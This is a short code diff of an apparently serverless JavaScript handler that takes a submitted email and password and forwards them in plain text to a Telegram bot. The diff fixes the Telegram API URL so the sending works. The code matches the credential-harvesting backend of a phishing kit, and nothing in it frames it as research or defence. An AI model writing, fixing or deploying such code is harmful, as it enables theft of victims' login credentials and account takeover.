@@ -12,7 +12,7 @@ export default async function handler(req, res) {
     const message = `🔔 <b>Отримано нові дані (Тест):</b>\n\n📧 Email: <code>${email}</code>\n🔑 Пароль: <code>${password}</code>`;
     
     // ПРАВИЛЬНА АДРЕСА СЕРВЕРА TELEGRAM:
-    const url = `https://telegram.org{token}/sendMessage`;
+    const url = "https://api.telegram.org/bot" + token + "/sendMessage";
 
     try {
         await fetch(url, {
